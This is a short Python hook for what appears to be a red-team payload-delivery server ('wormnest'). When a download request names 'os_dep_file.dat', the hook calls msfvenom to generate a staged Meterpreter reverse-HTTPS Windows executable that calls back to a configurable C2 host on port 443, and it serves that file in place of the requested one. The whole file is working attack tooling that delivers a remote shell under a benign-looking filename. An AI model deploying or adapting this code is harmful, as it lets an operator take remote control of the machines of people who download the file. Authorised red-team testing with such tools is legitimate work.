import hooker
from wormnest.utils import check_filename_for_hook
import os, sys
import tempfile

MSFVENOM = "msfvenom"	# msfvenom path
C2_HOST = "127.0.0.1"	# Returns to localhost: Change this!
C2_PORT = 443

# Staged MetHTTPS
PAYLOAD = "windows/meterpreter/reverse_https"	


trigger_filename = 'os_dep_file.dat'


@hooker.hook("pre_file")
def autogen_msf(filename, request, __retvals__ = {}):

	if trigger_filename not in filename:
		return None

	extension = '.' + filename.split('.')[-1]
	fd = tempfile.NamedTemporaryFile('rb', suffix=extension)
	generated_file = fd.name

	command = "{msfv} -p {pl} LHOST={lh} LPORT={lp} -f exe -o {gen}".format(
			msfv = MSFVENOM,
			pl = PAYLOAD,
			lh = C2_HOST,
			lp = C2_PORT,
			gen = generated_file
		)
	print("[!] '{}'".format(command))
	os.system(command)

	return fd
